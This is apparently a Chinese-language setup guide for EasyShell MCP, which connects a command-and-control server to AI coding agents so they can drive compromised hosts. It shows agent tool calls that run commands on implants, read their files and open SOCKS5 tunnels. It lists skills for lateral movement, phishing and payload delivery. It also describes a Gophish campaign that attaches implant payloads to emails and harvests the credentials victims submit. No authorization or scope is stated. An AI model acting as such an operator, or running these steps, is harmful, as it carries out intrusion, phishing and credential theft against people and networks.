# EasyShell MCP — 最简单使用指南

把 EasyShell TeamServer 接入 Cursor / Claude Code / Codex，在对话里直接控制上线植入体。

---

## 前置条件

| 项目 | 说明 |
|------|------|
| TeamServer | 已启动，浏览器能打开 `http://你的IP:8080` |
| 账号 | 默认 `admin`，密码首次运行时在控制台或 `logs/` 中查看 |
| Python | 3.10+，已安装 `pip` |
| 客户端 | Cursor / Claude Code / Codex CLI 等支持 MCP 的工具 |

验证服务可达（无需登录）：

```
GET http://127.0.0.1:8080/prod-api/api/crypto/public-key
```

---

## 三步安装（全平台）

```powershell
# 1. 安装依赖
cd easyshell-package\easyshell-mcp
pip install -r requirements.txt

# 2. 一键登录 + 写入全部 MCP 配置 + 安装 Skills
python easyshell_config.py --reinstall

# 3. 重启你的 IDE/CLI
```

`--reinstall` 会自动写入：

| 平台 | 配置文件 |
|------|----------|
| **Cursor** | `~/.cursor/mcp.json` + 项目 `.cursor/mcp.json` |
| **Claude Code** | `~/.claude.json` 项目级 `mcpServers` |
| **Claude Code** | `~/.claude/settings.json`、`~/.claude/mcp.json` |
| **Codex** | `~/.codex/config.toml` + 项目 `.codex/config.toml` |
| **Skills** | `.cursor/skills/` + 项目 `AGENTS.md` |

只装部分平台：

```powershell
python easyshell_config.py --url http://127.0.0.1:8080 --password <密码> --target cursor,claude,codex
```

仅同步 Skills：

```powershell
python easyshell_config.py --install-skills
```

卸载全部：`python easyshell_config.py --uninstall`

---

## 各平台验证

| 平台 | 验证方式 |
|------|----------|
| Cursor | 设置 → MCP → `easyshell` 绿色 |
| Claude Code | 重启后输入 `/mcp`，应有 `easyshell_*` 工具 |
| Codex | 重启 CLI，输入 `/mcp` 或问模型能否调用 easyshell 工具 |

---

## 开始使用

安装完成后，在对话里直接用自然语言，例如：

```
帮我诊断 EasyShell 连接
列出所有在线植入体
对 uid=xxx 执行 whoami 和 ipconfig，合并成一条命令
```

Agent 会自动调用 `easyshell_*` MCP 工具。

---

## 五个最常用操作

```
① easyshell_diagnose()
② easyshell_list_clients()
③ easyshell_exec_cmd(uid, 'cmd /c "whoami&ipconfig"')
④ easyshell_read_file(uid, "C:/result.txt")
⑤ easyshell_start_socks5(uid, port=1080, force=True)
```

---

## 三条避坑法则

1. **命令合并一条发** — 不要连发多条 `exec_cmd`
2. **读文件走 API** — `easyshell_read_file`，不要用 `type`
3. **隧道出口是植入体** — 本机能直连内网时优先 `easyshell_send_http`

---

## 加载 Skills

`--reinstall` 已自动同步到 `.cursor/skills/`。也可手动 `@` 引用：

| Skill | 路径 |
|-------|------|
| easyshell-mcp | `.cursor/skills/easyshell-mcp/SKILL.md` |
| easyshell-real | `easyshell-mcp/easyshell-real/skill.md` |
| easyshell-lateral | `easyshell-mcp/easyshell-lateral/skill.md` |
| easyshell-phishing | `easyshell-mcp/easyshell-phishing/skill.md` |
| easyshell-payload | `easyshell-mcp/easyshell-payload/skill.md` |
| easyshell-pentest | `skill/easyshell-pentest.md` |

Codex / Claude 也会读取项目根目录 `AGENTS.md` 中的技能索引。

---

## 目录结构

```
easyshell-package/
├── README.md
├── easyshell-mcp/
│   ├── server.py
│   ├── easyshell_api.py
│   ├── easyshell_config.py      # 多平台一键配置
│   ├── pentest_common.py        # 脚本公共 API
│   ├── pentest/                 # 一次性渗透脚本（74 个）
│   ├── easyshell-real/
│   ├── easyshell-lateral/
│   ├── easyshell-phishing/
│   └── easyshell-payload/       # 载荷生成与 Web 投递
├── skill/easyshell-pentest.md
└── memory/
```

---

## 一次性渗透脚本

```powershell
set EASYSHELL_UID=<植入体uid>
python pentest\_run_fscan.py
```

脚本从 `config` 或环境变量读凭据。日常操作优先用 MCP 工具。

---

## API 要点

| 项目 | EasyShell |
|------|-----------|
| 植入体 ID | 字符串 `uid` |
| API 前缀 | `/prod-api/api` |
| 认证 | `Authorization2: Bearer JWT` |
| 载荷 | AES-GCM + RSA（MCP 已封装） |
| 读文件 | 完整路径 `path` |

---

## 邮件钓鱼（Gophish）

Web 顶栏 **邮件钓鱼**（需系统设置开启 `gophish_enabled`）：

```
1. 配置 SMTP 发送配置 → 发送测试邮件
2. 导入用户组 CSV
3. 创建模板（可一键生成 EasyShell 载荷附件）
4. 创建活动 → 查看打开/点击/提交凭据
5. 植入体上线后 → @easyshell-real 做后渗透
```

详细 SOP：`easyshell-mcp/easyshell-phishing/skill.md`

---

## 更多文档

- TeamServer：`easyshell_server/docs/USAGE.md`
- 内网横向：`easyshell-mcp/easyshell-lateral/easyshell-mcp-guide.md`
- 隧道方法论：`memory/easyshell-tunnel-lessons.md`
- 实战复盘：`memory/easyshell-ops-lessons.md`
